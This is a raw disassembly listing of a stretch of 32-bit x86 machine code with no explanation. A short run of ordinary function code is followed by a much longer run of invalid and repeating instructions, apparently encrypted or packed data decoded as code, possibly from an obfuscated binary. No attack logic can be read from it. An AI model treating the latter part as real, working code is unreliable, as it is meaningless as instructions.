  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0x1315b529
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	cwde   
  415559:	mov    edx,0xdd09faa7
  41555e:	push   ds
  41555f:	addr16 jo 0x4155b2
  415562:	jmp    0x415558
  415564:	jmp    0x42793593
  415569:	or     bl,ch
  41556b:	push   ds
  41556c:	addr16 je 0x4155bf
  41556f:	jmp    0x415525
  415571:	push   ss
  415572:	aad    0xe0
  415574:	aaa    
  415575:	cli    
  415576:	or     bl,ch
  415578:	push   ds
  415579:	addr16 je 0x4155cc
  41557c:	jmp    0x415572
  41557e:	push   ss
  41557f:	aad    0xe0
  415581:	aaa    
  415582:	cli    
  415583:	or     bl,ch
  415585:	push   ds
  415586:	addr16 je 0x4155d9
  415589:	jmp    0x41557f
  41558b:	push   ss
  41558c:	aad    0xe0
  41558e:	aaa    
  41558f:	cli    
  415590:	or     bl,ch
  415592:	push   ds
  415593:	addr16 jl 0x4155e7
  415596:	jmp    0x41558c
  415598:	sbb    dl,cl
  41559a:	pop    edx
  41559b:	cmp    edx,edi
  41559d:	mov    esi,0xcc46d3d4
  4155a2:	push   ecx
  4155a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a4:	cmp    DWORD PTR [edi],esi
  4155a6:	or     DWORD PTR [eax-0x52d576a2],0x2213086c
  4155b0:	mov    bl,BYTE PTR [ecx+0x5981b636]
  4155b6:	xchg   esp,eax
  4155b7:	gs test eax,0x7011053e
  4155bd:	cdq    
  4155be:	cmp    DWORD PTR [eax-0xb],0x4eda5989
  4155c5:	xchg   edx,eax
  4155c6:	dec    ebp
  4155c7:	inc    edi
  4155c8:	sbb    DWORD PTR [edi],edi
  4155ca:	(bad)  
  4155cb:	xchg   ecx,eax
  4155cc:	cmp    al,bl
  4155ce:	in     eax,dx
  4155cf:	cmp    eax,0x1edd0ade
  4155d4:	addr16 je 0x415627
  4155d7:	jmp    0x415567
  4155d9:	fld    st(3)
  4155db:	outs   dx,BYTE PTR ds:[esi]
  4155dc:	or     DWORD PTR [edx+esi*2+0x0],edx
  4155e0:	and    cl,cl
  4155e2:	or     al,0x8d
  4155e4:	aad    0x5a
  4155e6:	outs   dx,BYTE PTR ds:[esi]
  4155e7:	or     ch,al
  4155e9:	add    al,0x1c
  4155eb:	xlat   BYTE PTR ds:[ebx]
  4155ec:	push   DWORD PTR [eax-0x278a56e1]
  4155f2:	es retf 
  4155f4:	push   0x4e
  4155f6:	dec    edi
  4155f7:	daa    
  4155f8:	das    
  4155f9:	out    dx,al
  4155fa:	int    0xba
  4155fc:	popa   
  4155fd:	(bad)  
  4155fe:	xchg   ebx,eax
  4155ff:	sub    DWORD PTR [edi+0xd],eax
  415602:	xor    ebp,edx
  415604:	shl    DWORD PTR [ebp+eiz*4-0x545daf3d],0x36
  41560c:	ret    
  41560d:	mov    eax,0x2c003dad
  415612:	loope  0x415614
  415614:	cmp    ecx,ecx
  415616:	or     al,0x8d
  415618:	aad    0x5a
  41561a:	outs   dx,DWORD PTR ds:[esi]
  41561b:	or     BYTE PTR [ecx+0x1fd78298],ch
  415621:	nop
  415622:	or     eax,0x8c4560a9
  415627:	retf   
  415628:	lock shl eax,cl
  41562b:	daa    
  41562c:	jae    0x4156a1
  41562e:	mov    dx,0x6351
  415632:	or     DWORD PTR [ecx],ebp
  415634:	sub    DWORD PTR [ebx-0x68],edi
  415637:	jmp    0xda58:0xc33839df
  41563e:	sub    BYTE PTR [esi],dh
  415640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415641:	jg     0x4155f9
  415643:	mov    BYTE PTR [ecx],cl
  415645:	push   esp
  415646:	jb     0x415648
  415648:	push   ds
  415649:	addr16 je 0x41569c
  41564c:	jmp    0x415642
  41564e:	push   ss
  41564f:	aad    0xe0
  415651:	aaa    
  415652:	cli    
  415653:	or     bl,ch
  415655:	push   ds
  415656:	addr16 je 0x4156a9
  415659:	jmp    0x41564f
  41565b:	push   ss
  41565c:	aad    0xe0
  41565e:	aaa    
  41565f:	cli    
  415660:	pop    edx
  415661:	cwde   
  415662:	push   ds
  415663:	cmp    BYTE PTR [bx+di-0x18],dl
  415667:	hlt    
  415668:	jo     0x415605
  41566a:	lods   eax,DWORD PTR ds:[esi]
  41566b:	js     0x415667
  41566d:	or     bl,ch
  41566f:	push   ds
  415670:	addr16 je 0x4156c3
  415673:	jmp    0x415689
  415675:	push   ss
  415676:	xlat   BYTE PTR ds:[ebx]
  415677:	loope  0x4156b5
  415679:	sti    
  41567a:	add    ch,bl
  41567c:	push   ds
  41567d:	test   DWORD PTR [eax+0x50],esi
  415680:	jmp    0x4156f2
  415682:	adc    ch,dl
  415684:	loopne 0x4156bd
  415686:	cli    
  415687:	or     bl,BYTE PTR [esi+0x507467a3]
  41568d:	sti    
  41568e:	hlt    
  41568f:	push   ss
  415690:	aad    0xe0
  415692:	xor    bh,dl
  415694:	or     bl,ch
  415696:	pop    esi
  415697:	addr16 je 0x4156da
  41569a:	jmp    0x415690
  41569c:	push   ss
  41569d:	xlat   BYTE PTR ds:[ebx]
  41569e:	loopne 0x4156d7
  4156a0:	dec    DWORD PTR [edx]
  4156a2:	fcomp  QWORD PTR [esi]
  4156a4:	addr16 je 0x4156f7
  4156a7:	jmp    0x41569a
  4156a9:	push   ss
  4156aa:	aam    0xe0
  4156ac:	aaa    
  4156ad:	cli    
  4156ae:	or     bl,ch
  4156b0:	push   ds
  4156b1:	push   edi
  4156b2:	js     0x415704
  4156b4:	jmp    0x4156a6
  4156b6:	push   ss
  4156b7:	aad    0xea
  4156b9:	leave  
  4156ba:	dec    BYTE PTR [edx]
  4156bc:	fistp  WORD PTR [esi]
  4156be:	daa    
  4156bf:	cmc    
  4156c0:	push   eax
  4156c1:	jmp    0x4156a7
  4156c3:	push   ss
  4156c4:	aad    0xf0
  4156c6:	aaa    
  4156c7:	cli    
  4156c8:	or     bl,ch
  4156ca:	push   cs
  4156cb:	addr16 je 0x41570e
  4156ce:	jmp    0x4156c4
  4156d0:	push   ss
  4156d1:	aad    0xe0
  4156d3:	aaa    
  4156d4:	jmp    0x5074:0x671edd0a
  4156db:	jmp    0x4156d1
  4156dd:	push   ss
  4156de:	aad    0xe0
  4156e0:	xor    edi,edx
  4156e2:	push   es
  4156e3:	fld    QWORD PTR [edi+0x64]
  4156e6:	je     0x415738
  4156e8:	jmp    0x41571e
  4156ea:	sbb    eax,0xfa08b5d5
  4156ef:	or     bl,ch
  4156f1:	push   ds
  4156f2:	addr16 je 0x415745
  4156f5:	jmp    0x4156eb
  4156f7:	push   ss
  4156f8:	aad    0xe0
  4156fa:	aaa    
  4156fb:	cli    
  4156fc:	or     bl,ch
  4156fe:	push   ds
  4156ff:	addr16 je 0x415772
  415702:	out    0xf4,eax
  415704:	push   cs
  415705:	aad    0xe0
  415707:	aaa    
  415708:	cli    
  415709:	or     bl,ch
  41570b:	push   ds
  41570c:	addr16 je 0x41575f
  41570f:	jmp    0x415705
  415711:	push   ss
  415712:	aad    0xe0
  415714:	aaa    
  415715:	cli    
  415716:	or     bl,ch
  415718:	push   ds
  415719:	addr16 je 0x41576c
  41571c:	jmp    0x415712
  41571e:	push   ss
  41571f:	aad    0xe0
  415721:	aaa    
  415722:	cli    
  415723:	or     bl,ch
  415725:	push   ds
  415726:	addr16 je 0x415779
  415729:	jmp    0x41571f
  41572b:	push   ss
  41572c:	aad    0xe0
  41572e:	aaa    
  41572f:	cli    
  415730:	or     bl,ch
  415732:	push   ds
  415733:	addr16 je 0x415786
  415736:	jmp    0x41572c
  415738:	push   ss
  415739:	aad    0xe0
  41573b:	aaa    
  41573c:	cli    
  41573d:	or     bl,ch
  41573f:	push   ds
  415740:	addr16 je 0x415793
  415743:	jmp    0x415739
  415745:	push   ss
  415746:	aad    0xe0
  415748:	aaa    
  415749:	cli    
  41574a:	or     bl,ch
  41574c:	push   ds
  41574d:	addr16 je 0x4157a0
  415750:	jmp    0x415746
  415752:	push   ss
  415753:	aad    0xe0
  415755:	aaa    
  415756:	cli    
  415757:	or     dh,bl
  415759:	push   0x2
  41575b:	or     al,0x24
  41575d:	jmp    0x415753
  41575f:	push   ss
  415760:	aad    0x50
  415762:	cmp    al,0xfa
  415764:	or     cl,ch
  415766:	push   ds
  415767:	addr16 je 0x4157a0
  41576a:	out    dx,eax
  41576b:	hlt    
  41576c:	push   ss
  41576d:	shl    eax,1
  41576f:	aaa    
  415770:	stos   BYTE PTR es:[edi],al
  415771:	dec    edi
  415772:	sahf   
  415773:	sub    al,0x33
  415775:	cmp    edx,DWORD PTR [eax-0x15]
  415778:	hlt    
  415779:	push   ss
  41577a:	aad    0xe0
  41577c:	pop    ss
  41577d:	cli    
  41577e:	or     bh,BYTE PTR ds:0x22071530
  415784:	mov    ah,dh
  415786:	push   ss
  415787:	aad    0xe0
  415789:	push   edi
  41578a:	cli    
  41578b:	or     bl,ch
  41578d:	fisubr WORD PTR [esp+esi*2+0x50]
  415791:	mov    ecx,0x8ad516f4
  415796:	xor    edi,edx
  415798:	or     bl,ch
  41579a:	push   ds
  41579b:	addr16 je 0x4157ee
  41579e:	jmp    0x415794
  4157a0:	push   ss
  4157a1:	aad    0xe0
  4157a3:	aaa    
  4157a4:	fimul  DWORD PTR [edx]
  4157a6:	(bad)  
  4157a8:	dec    ecx
  4157a9:	push   es
  4157aa:	xor    eax,0xd5759b87
  4157af:	loopne 0x4157e8
  4157b1:	clc    
  4157b2:	or     bl,ch
  4157b4:	push   ds
  4157b5:	inc    edi
  4157b6:	js     0x415808
  4157b8:	jmp    0x4157b0
  4157ba:	push   ss
  4157bb:	aad    0xe0
  4157bd:	mov    edi,esi
  4157bf:	or     bl,ch
  4157c1:	push   ds
  4157c2:	addr16 je 0x415815
  4157c5:	jmp    0x4157bb
  4157c7:	push   ss
  4157c8:	aad    0xe0
  4157ca:	aaa    
  4157cb:	cli    
  4157cc:	dec    edx
  4157cd:	fstp   QWORD PTR [esi]
  4157cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157d0:	je     0x415822
  4157d2:	jmp    0x4157c8
  4157d4:	push   ss
  4157d5:	aad    0xe0
  4157d7:	aaa    
  4157d8:	cli    
  4157d9:	or     bl,ch
  4157db:	push   ds
  4157dc:	addr16 je 0x41582f
  4157df:	jmp    0x4157d5
  4157e1:	push   ss
  4157e2:	aad    0xe0
  4157e4:	aaa    
  4157e5:	cli    
  4157e6:	or     bl,ch
  4157e8:	push   ds
  4157e9:	addr16 je 0x41583c
  4157ec:	jmp    0x4157e2
  4157ee:	push   ss
  4157ef:	aad    0xe0
  4157f1:	aaa    
  4157f2:	cli    
  4157f3:	or     bl,ch
  4157f5:	push   ds
  4157f6:	addr16 je 0x415849
  4157f9:	jmp    0x4157ef
  4157fb:	push   ss
  4157fc:	aad    0xe0
  4157fe:	aaa    
  4157ff:	cli    
  415800:	or     bl,ch
  415802:	push   ds
  415803:	addr16 je 0x415856
  415806:	jmp    0x4157fc
  415808:	push   ss
  415809:	aad    0xe0
  41580b:	aaa    
  41580c:	cli    
  41580d:	or     bl,ch
  41580f:	push   ds
  415810:	addr16 je 0x415863
  415813:	jmp    0x415809
  415815:	push   ss
  415816:	aad    0xe0
  415818:	aaa    
  415819:	cli    
  41581a:	or     bl,ch
  41581c:	push   ds
  41581d:	addr16 je 0x415870
  415820:	jmp    0x415816
  415822:	push   ss
  415823:	aad    0xe0
  415825:	aaa    
  415826:	cli    
  415827:	or     bl,ch
  415829:	push   ds
  41582a:	addr16 je 0x41587d
  41582d:	jmp    0x415823
  41582f:	push   ss
  415830:	aad    0xe0
  415832:	aaa    
  415833:	cli    
  415834:	or     bl,ch
  415836:	push   ds
  415837:	addr16 je 0x41588a
  41583a:	jmp    0x415830
  41583c:	push   ss
  41583d:	aad    0xe0
  41583f:	aaa    
  415840:	cli    
  415841:	or     bl,ch
  415843:	push   ds
  415844:	addr16 je 0x415897
  415847:	jmp    0x41583d
  415849:	push   ss
  41584a:	aad    0xe0
  41584c:	aaa    
  41584d:	cli    
  41584e:	or     bl,ch
  415850:	push   ds
  415851:	addr16 je 0x4158a4
  415854:	jmp    0x41584a
  415856:	push   ss
  415857:	aad    0xe0
  415859:	aaa    
  41585a:	cli    
  41585b:	or     bl,ch
  41585d:	push   ds
  41585e:	addr16 je 0x4158b1
  415861:	jmp    0x415857
  415863:	push   ss
  415864:	aad    0xe0
  415866:	aaa    
  415867:	cli    
  415868:	or     bl,ch
  41586a:	push   ds
  41586b:	addr16 je 0x4158be
  41586e:	jmp    0x415864
  415870:	push   ss
  415871:	aad    0xe0
  415873:	aaa    
  415874:	cli    
  415875:	or     bl,ch
  415877:	push   ds
  415878:	addr16 je 0x4158cb
  41587b:	jmp    0x415871
  41587d:	push   ss
  41587e:	aad    0xe0
  415880:	aaa    
  415881:	cli    
  415882:	or     bl,ch
  415884:	push   ds
  415885:	addr16 je 0x4158d8
  415888:	jmp    0x41587e
  41588a:	push   ss
  41588b:	aad    0xe0
  41588d:	aaa    
  41588e:	cli    
  41588f:	or     bl,ch
  415891:	push   ds
  415892:	addr16 je 0x4158e5
  415895:	jmp    0x41588b
  415897:	push   ss
  415898:	aad    0xe0
  41589a:	aaa    
  41589b:	cli    
  41589c:	or     bl,ch
  41589e:	push   ds
  41589f:	addr16 je 0x4158f2
  4158a2:	jmp    0x415898
  4158a4:	push   ss
  4158a5:	aad    0xe0
  4158a7:	aaa    
  4158a8:	cli    
  4158a9:	or     bl,ch
  4158ab:	push   ds
  4158ac:	addr16 je 0x4158ff
  4158af:	jmp    0x4158a5
  4158b1:	push   ss
  4158b2:	aad    0xe0
  4158b4:	aaa    
  4158b5:	cli    
  4158b6:	or     bl,ch
  4158b8:	push   ds
  4158b9:	addr16 je 0x41590c
  4158bc:	jmp    0x4158b2
  4158be:	push   ss
  4158bf:	aad    0xe0
  4158c1:	aaa    
  4158c2:	cli    
  4158c3:	or     bl,ch
  4158c5:	push   ds
  4158c6:	addr16 je 0x415919
  4158c9:	jmp    0x4158bf
  4158cb:	push   ss
  4158cc:	aad    0xe0
  4158ce:	aaa    
  4158cf:	cli    
  4158d0:	or     bl,ch
  4158d2:	push   ds
  4158d3:	addr16 je 0x415926
  4158d6:	jmp    0x4158cc
  4158d8:	push   ss
  4158d9:	aad    0xe0
  4158db:	aaa    
  4158dc:	cli    
  4158dd:	or     bl,ch
  4158df:	push   ds
  4158e0:	addr16 je 0x415933
  4158e3:	jmp    0x4158d9
  4158e5:	push   ss
  4158e6:	aad    0xe0
  4158e8:	aaa    
  4158e9:	cli    
  4158ea:	or     bl,ch
  4158ec:	push   ds
  4158ed:	addr16 je 0x415940
  4158f0:	jmp    0x4158e6
  4158f2:	push   ss
  4158f3:	aad    0xe0
  4158f5:	aaa    
  4158f6:	cli    
  4158f7:	or     bl,ch
  4158f9:	push   ds
  4158fa:	addr16 je 0x41594d
  4158fd:	jmp    0x4158f3
  4158ff:	push   ss
  415900:	aad    0xe0
  415902:	aaa    
  415903:	cli    
  415904:	or     bl,ch
  415906:	push   ds
  415907:	addr16 je 0x41595a
  41590a:	jmp    0x415900
  41590c:	push   ss
  41590d:	aad    0xe0
  41590f:	aaa    
  415910:	cli    
  415911:	or     bl,ch
  415913:	push   ds
  415914:	addr16 je 0x415967
  415917:	jmp    0x41590d
  415919:	push   ss
  41591a:	aad    0xe0
  41591c:	aaa    
  41591d:	cli    
  41591e:	or     bl,ch
  415920:	push   ds
  415921:	addr16 je 0x415974
  415924:	jmp    0x41591a
  415926:	push   ss
  415927:	aad    0xe0
  415929:	aaa    
  41592a:	cli    
  41592b:	or     bl,ch
  41592d:	push   ds
  41592e:	addr16 je 0x415981
  415931:	jmp    0x415927
  415933:	push   ss
  415934:	aad    0xe0
  415936:	aaa    
  415937:	cli    
  415938:	or     bl,ch
  41593a:	push   ds
  41593b:	addr16 je 0x41598e
  41593e:	jmp    0x415934
  415940:	push   ss
  415941:	aad    0xe0
  415943:	aaa    
  415944:	cli    
  415945:	or     bl,ch
  415947:	push   ds
  415948:	addr16 je 0x41599b
  41594b:	jmp    0x415941
  41594d:	push   ss
  41594e:	aad    0xe0
  415950:	aaa    
  415951:	cli    
  415952:	or     bl,ch
  415954:	push   ds
  415955:	addr16 je 0x4159a8
  415958:	inc    eax
  415959:	mov    edx,0x37cfd51d
  41595e:	cli    
  41595f:	sbb    bl,ch
  415961:	push   ds
  415962:	dec    ebp
  415963:	(bad)  
  415964:	mov    bl,BYTE PTR [edi-0xd19a6b7]
  41596a:	sbb    al,0xc1
  41596c:	aaa    
  41596d:	xor    ch,BYTE PTR [ebx-0x4de68d0b]
  415973:	add    eax,0x70f366ca
  415978:	shl    ebx,0x5
  41597b:	xchg   ebp,eax
  41597c:	and    eax,0xbb119205
  415981:	or     DWORD PTR [ebx+0x69bae33f],0xa5dcfdb0
  41598b:	jne    0x415935
  41598d:	std    
  41598e:	sahf   
  41598f:	push   ebp
  415990:	test   edx,0x5de533da
  415996:	cmp    BYTE PTR gs:[edi],dl
  415999:	xor    ebp,DWORD PTR [eax-0x3f]
  41599c:	call   0x9c4:0xfe0c84de
  4159a3:	sub    DWORD PTR [ebp-0xe977bfe],eax
  4159a9:	lds    edi,FWORD PTR [edi-0x39]
  4159ac:	push   eax
  4159ad:	xor    BYTE PTR [eax-0x65],dh
  4159b0:	sub    al,0x88
  4159b2:	cli    
  4159b3:	add    al,0x12
  4159b5:	aaa    
  4159b6:	inc    edx
  4159b7:	cmp    al,0xd6
  4159b9:	popa   
  4159ba:	sub    eax,0x34632b8f
  4159bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c0:	int    0x90
  4159c2:	stos   DWORD PTR es:[edi],eax
  4159c3:	cmp    bl,BYTE PTR [ebp+0x29bdaf0f]
  4159c9:	bound  esi,QWORD PTR [esi]
  4159cb:	ins    BYTE PTR es:[edi],dx
  4159cc:	dec    eax
  4159cd:	(bad)  
  4159ce:	xchg   ecx,eax
  4159cf:	mov    ah,0x5f
  4159d1:	les    edx,FWORD PTR [eax+ebp*2]
  4159d4:	out    dx,al
  4159d5:	inc    esi
  4159d6:	jl     0x4159f4
  4159d8:	ins    DWORD PTR es:[edi],dx
  4159d9:	mov    bl,0x7c
  4159db:	rol    BYTE PTR [ebx+0x45],1
  4159de:	dec    ebx
  4159df:	lds    esp,FWORD PTR [edi+0x78]
  4159e2:	mov    ebx,0xd4ea3138
  4159e7:	jle    0x41599c
  4159e9:	lahf   
  4159ea:	sub    al,0xd4
  4159ec:	or     dl,bl
  4159ee:	nop
  4159ef:	stos   DWORD PTR es:[edi],eax
  4159f0:	xor    dh,BYTE PTR [edi+eax*4-0x79]
  4159f4:	(bad)  
  4159f6:	or     al,0x93
  4159f8:	ret    0xa2cc
  4159fb:	rcl    BYTE PTR [ecx+edx*8],0x94
  4159ff:	ficomp WORD PTR [esi-0x76dddef9]
  415a05:	xchg   esp,eax
  415a06:	mul    bh
  415a08:	aaa    
  415a09:	sbb    DWORD PTR ds:0x3e41cce,esi
  415a0f:	jns    0x4159af
  415a11:	adc    BYTE PTR [edi],dh
  415a13:	adc    al,0x96
  415a15:	cmp    bh,BYTE PTR [edx-0x4a]
  415a18:	xlat   BYTE PTR ds:[ebx]
  415a1a:	mov    bh,0x78
  415a1c:	sbb    DWORD PTR [esi-0x2e430c76],esp
  415a22:	xlat   BYTE PTR ds:[ebx]
  415a23:	jne    0x4159ec
  415a25:	adc    BYTE PTR [ebp+0x17655100],bh
  415a2b:	sbb    eax,0x77e9783
  415a30:	mov    dh,0xec
  415a32:	bound  edx,QWORD PTR [esi+0x3f]
  415a35:	pop    ds
  415a36:	outs   dx,BYTE PTR ds:[esi]
  415a37:	std    
  415a38:	loop   0x4159bd
  415a3a:	out    dx,al
  415a3b:	mov    ebx,0xabf655e3
  415a40:	fmul   DWORD PTR [edi+0x6b]
  415a43:	jp     0x4159d3
  415a45:	xor    ecx,eax
  415a47:	mov    cl,0x26
  415a49:	aaa    
  415a4a:	fwait
  415a4b:	outs   dx,DWORD PTR ds:[esi]
  415a4c:	test   eax,0x5880f7ce
  415a51:	fdiv   QWORD PTR [ebx]
  415a53:	int    0xe8
  415a55:	retf   0xf8de
  415a58:	fcmove st,st(3)
  415a5a:	call   0xf37a:0x231b15ca
  415a61:	adc    BYTE PTR ss:[eax],cl
  415a64:	sbb    eax,0xb5b6d9bb
  415a69:	dec    ebx
  415a6a:	hlt    
  415a6b:	fdiv   st(7),st
  415a6d:	sub    al,0x24
  415a6f:	les    edi,FWORD PTR [ebp-0x6c]
  415a72:	(bad)  
  415a73:	int3   
  415a74:	cmp    DWORD PTR [edi-0x7a],esp
  415a77:	dec    ebx
  415a78:	test   al,0x6
  415a7a:	mov    ds:0xe7dc6a2f,al
  415a80:	out    dx,al
  415a81:	mov    ch,0x90
  415a83:	pop    ebx
  415a84:	popf   
  415a85:	mov    bl,0x99
  415a87:	test   ch,ch
  415a89:	mov    ebp,0x9148d5d7
  415a8e:	push   ss
  415a8f:	push   esi
  415a90:	cwde   
  415a91:	sub    BYTE PTR [esi+0xbc50391],al
  415a97:	out    0x89,al
  415a99:	push   0x3be1c8aa
  415a9e:	add    DWORD PTR [esi],0xffffffc3
  415aa1:	ins    DWORD PTR es:[edi],dx
  415aa2:	in     al,0x42
  415aa4:	jmp    0x92:0x302c83e9
  415aab:	pop    edx
  415aac:	popa   
  415aad:	mov    al,ds:0xcca2d402
  415ab2:	add    eax,DWORD PTR [esi+0x48]
  415ab5:	stc    
  415ab6:	(bad)  
  415ab8:	cmp    DWORD PTR [ebx-0x515287f3],0x13f23b4e
  415ac2:	sti    
  415ac3:	fmulp  st(4),st
  415ac5:	pushf  
  415ac6:	pop    edi
  415ac7:	dec    esi
  415ac8:	xor    BYTE PTR [ebp+esi*4+0x5a666bf2],bh
  415acf:	dec    ebx
  415ad0:	or     bh,BYTE PTR [ebx]
  415ad2:	push   esp
  415ad3:	jno    0x415b12
  415ad5:	push   cs
  415ad6:	xchg   DWORD PTR gs:[ebx+esi*1],ecx
  415ada:	dec    edi
  415adb:	adc    edx,DWORD PTR [esi+0x2297080]
  415ae1:	dec    eax
  415ae2:	or     eax,0x204554c5
  415ae7:	push   0xdb0087aa
  415aec:	sub    eax,0xdbcf1ef2
  415af1:	arpl   bp,si
  415af3:	cmp    esp,DWORD PTR [ebp-0x4d]
  415af6:	int3   
  415af7:	push   ebx
  415af8:	test   eax,0xa904683e
  415afd:	hlt    
  415afe:	jle    0x415acd
  415b00:	dec    edi
  415b01:	shl    eax,cl
  415b03:	lock dec ecx
  415b05:	mov    bh,0x90
  415b07:	mov    esp,0x489f11b1
  415b0c:	leave  
  415b0d:	mov    ds:0xd29e999d,eax
  415b12:	mov    dh,0xa
  415b14:	mov    al,0xd7
  415b16:	inc    esp
  415b17:	outs   dx,DWORD PTR ds:[esi]
  415b18:	(bad)
  415b1c:	lea    esp,[ebx]
  415b1e:	aaa    
  415b1f:	lock jmp 0xa6a7:0x4dbf6160
  415b27:	add    esi,DWORD PTR [edi]
  415b29:	(bad)  [ebx-0x7dd2daf]
  415b2f:	xchg   ebp,eax
  415b30:	sti    
  415b31:	pop    eax
  415b32:	out    dx,al
  415b33:	fisub  WORD PTR [ebx]
  415b35:	xor    dh,BYTE PTR [ecx]
  415b37:	mov    ah,BYTE PTR [edi-0x1b]
  415b3a:	cld    
  415b3b:	mov    BYTE PTR [edi-0x68],cl
  415b3e:	adc    edi,DWORD PTR [edx+0x8]
  415b41:	ret    
  415b42:	shl    BYTE PTR [ecx-0x50c1ba10],1
  415b48:	mov    esp,0xfdf8f2e2
  415b4d:	jo     0x415b86
  415b4f:	push   ds
  415b50:	mov    ds:0xea480d58,al
  415b55:	xor    DWORD PTR [esi+0x302a4b77],eax
  415b5b:	mov    ds:0xe39795db,al
  415b60:	jle    0x415b93
  415b62:	aaa    
  415b63:	xchg   BYTE PTR [eax],dl
  415b65:	in     eax,dx
  415b66:	jno    0x415b4f
  415b68:	cmp    al,0x7e
  415b6a:	cwde   
  415b6b:	mov    ds:0x4548ee8f,al
  415b70:	ins    DWORD PTR es:[edi],dx
  415b71:	popf   
  415b72:	mov    esp,0x17e93098
  415b77:	fucom  st(1)
  415b79:	in     eax,0x38
  415b7b:	jle    0x415b90
  415b7d:	or     al,0x37
  415b7f:	pop    edx
  415b80:	loope  0x415bd3
  415b82:	aaa    
  415b83:	adc    DWORD PTR [ebx+0x28ceef37],eax
  415b89:	test   BYTE PTR [ebx+eiz*1-0x1],0xba
  415b8e:	dec    ebx
  415b8f:	push   cs
  415b90:	ficom  WORD PTR [eax+ebp*1]
  415b93:	jecxz  0x415b8d
  415b95:	pop    ebp
  415b96:	lods   al,BYTE PTR ds:[esi]
  415b97:	jg     0x415bb5
  415b99:	int3   
  415b9a:	fistp  DWORD PTR [ebx+eax*1+0x74f7101e]
  415ba1:	loop   0x415bc0
  415ba3:	push   ebx
  415ba4:	inc    BYTE PTR [esi-0x7c]
  415ba7:	bound  esi,QWORD PTR [ecx-0x460fc6c0]
  415bad:	aas    
  415bae:	push   ebx
  415baf:	pop    es
  415bb0:	xor    BYTE PTR gs:[ecx],cl
  415bb3:	jno    0x415b3f
  415bb5:	pop    eax
  415bb6:	sub    edi,DWORD PTR [edx-0x42]
  415bb9:	add    BYTE PTR [edx+0x28],ah
  415bbc:	fnstenv [esi-0x65]
  415bbf:	int    0xa4
  415bc1:	pop    es
  415bc2:	mul    BYTE PTR [edx+eiz*4+0x72]
  415bc6:	rcl    BYTE PTR [ebx+0x61602d75],0xaa
  415bcd:	pop    ebp
  415bce:	retf   0x9178
  415bd1:	push   esi
  415bd2:	(bad)  
  415bd3:	rcl    ebp,0x88
  415bd6:	xor    eax,0x5c71173a
  415bdb:	cmc    
  415bdc:	outs   dx,DWORD PTR ds:[esi]
  415bdd:	jl     0x415c5a
  415bdf:	and    ebp,DWORD PTR [eax]
